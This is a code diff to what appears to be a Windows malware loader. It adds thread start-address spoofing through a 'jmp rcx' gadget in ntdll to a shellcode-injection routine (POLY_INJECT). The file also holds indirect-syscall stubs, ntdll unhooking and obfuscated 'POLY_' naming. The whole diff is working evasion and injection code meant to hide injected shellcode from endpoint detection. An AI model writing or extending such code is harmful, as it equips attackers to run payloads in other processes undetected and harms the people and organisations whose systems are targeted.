@@ -161,6 +161,7 @@ static int POLY_JUNK3(void){ int s=0; for(int i=0;i<POLY_CONST4;i++) s+=i; retur
 static HMODULE POLY_NTDLL          = NULL;
 static PBYTE   POLY_STUBS          = NULL;  /* 8 pre-baked RX indirect-syscall stubs */
 static PBYTE   POLY_SYSCALL_GADGET = NULL;  /* syscall;ret gadget in ntdll .text     */
+static PBYTE   POLY_JMP_RCX       = NULL;  /* jmp rcx gadget — thread start spoof  */
 
 #define LT_SI_ALLOC   0
 #define LT_SI_WRITE   1
@@ -339,6 +340,9 @@ static const BYTE _lt_stub_tmpl[32] = {
 };
 
 /* ─── Pre-baked W^X indirect-syscall stubs ─── */
+/* forward declaration — defined after Task 2 sleep code */
+static PBYTE POLY_FINDGADGET(HMODULE ntdll);
+
 static BOOL POLY_INITSTUB(void) {
     POLY_NTDLL=(HMODULE)GetModuleHandleA("ntdll.dll");
     if(!POLY_NTDLL) return FALSE;
@@ -377,6 +381,8 @@ static BOOL POLY_INITSTUB(void) {
     }
     ULONG old=0; PVOID pb=POLY_STUBS; SIZE_T psz=LT_NSTUBS*32;
     fnProt(GetCurrentProcess(),&pb,&psz,PAGE_EXECUTE_READ,&old);
+    /* Task 18 — jmp rcx gadget for thread start address spoofing in POLY_INJECT */
+    POLY_JMP_RCX=POLY_FINDGADGET(POLY_NTDLL);
     return TRUE;
 }
 
@@ -525,6 +531,8 @@ static void POLY_UNHOOK(void) {
         _sb=POLY_STUBS; _ssz=LT_NSTUBS*32;
         POLY_NTPROT(GetCurrentProcess(),&_sb,&_ssz,PAGE_EXECUTE_READ,&old2);
     }
+    /* Re-find jmp rcx gadget — clean ntdll bytes may have shifted its offset */
+    POLY_JMP_RCX=POLY_FINDGADGET((HMODULE)POLY_NTDLL);
 }
 
 /* ─── NtQuerySystemInformation wrapper ─── */
@@ -765,8 +773,13 @@ static BOOL POLY_INJECT(DWORD pid, PBYTE sc, SIZE_T sclen) {
     if(!NT_SUCCESS(POLY_NTPROT(hProc,&base,&sz,PAGE_EXECUTE_READ,&old)))
         {POLY_NTCLOSE(hProc);return FALSE;}
 
+    /* Task 18 — thread start address spoof: use jmp rcx gadget in ntdll as the
+     * thread start so Win32StartAddress shows ntdll, not the shellcode page.
+     * jmp rcx fires with RCX = base (the wrapped shellcode), transferring execution. */
+    PBYTE _tstart = POLY_JMP_RCX ? POLY_JMP_RCX : base;
+    PVOID _targ   = POLY_JMP_RCX ? (PVOID)base   : NULL;
     HANDLE hThread=NULL;
-    POLY_NTTHREAD(&hThread,THREAD_ALL_ACCESS,NULL,hProc,base,NULL,0,0,0x200000,0x200000,NULL);
+    POLY_NTTHREAD(&hThread,THREAD_ALL_ACCESS,NULL,hProc,_tstart,_targ,0,0,0x200000,0x200000,NULL);
     if(hThread) POLY_NTCLOSE(hThread);
     POLY_NTCLOSE(hProc);
     return hThread!=NULL;
